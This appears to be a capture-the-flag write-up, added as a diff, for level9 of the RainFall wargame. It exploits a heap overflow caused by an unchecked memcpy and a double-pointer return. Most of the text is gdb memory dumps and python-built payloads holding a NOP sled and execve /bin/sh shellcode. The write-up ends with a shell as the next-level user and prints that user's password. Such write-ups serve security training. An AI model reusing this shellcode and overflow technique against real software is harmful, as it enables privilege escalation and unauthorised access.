@@ -1,0 +1,53 @@
+The program allocates 2 buffers of 108bytes, then copy the first argument to the buffer1 with memcpy and len of av[1]. “memcpy(buff1+4, av[1], strlen(av[1]));”
+
+At the end the program return double pointer of buffer2 “return(**buff2);”, with some args we dont need for the exploit.
+
+I will use external Shellcode.
+
+Starting program: /home/user/level9/level9 a
+0x804a000:	0x00000000	0x00000071	0x08048848	0x00000061
+0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
+….
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
+….
+0x804a0e0:	0x00000006	0x00020f21
+
+Since the program return double pointer, i must jump in memory 2 times then go to the shellcode
+
+Starting program: /home/user/level9/level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111`python -c "print('\x7c\xa0\x04\x08')"`AAAA
+
+0x804a070:	0x5a5a5a5a	0x31313131	0x0804a07c	0x41414141
+
+eip            0x41414141	0x41414141
+0x41414141 in ?? ()
+
+(gdb) r `python -c "print('\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xa0\x04\x08XXXX')"`
+
+0x804a000:	0x00000000	0x00000071	0x08048848	0x90909090
+0x804a010:	0x90909090	0xe1f7c931	0x2f2f6851	0x2f686873
+0x804a020:	0x896e6962	0xcd0bb0e3	0x41414180	0x41414141
+0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+….
+0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a070:	0x41414141	0x41414141	0x0804a07c	0x58585858
+
+Now i will change the XXXX to 0x804a010 wish contains a nop slope then the shellcode.
+
+r `python -c "print('\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xa0\x04\x08\x10\xa0\x04\x08')"`
+
+Starting program: /home/user/level9/level9 `python -c "print('\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xa0\x04\x08\x10\xa0\x04\x08')"`
+process 3569 is executing new program: /bin/dash
+$
+
+out of gdb
+
+level9@RainFall:~$ ./level9 `python -c "print('\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xa0\x04\x08\x10\xa0\x04\x08')"`
+$ whoami
+bonus0
+$ cd ..
+$ cd bonus0
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+$
+
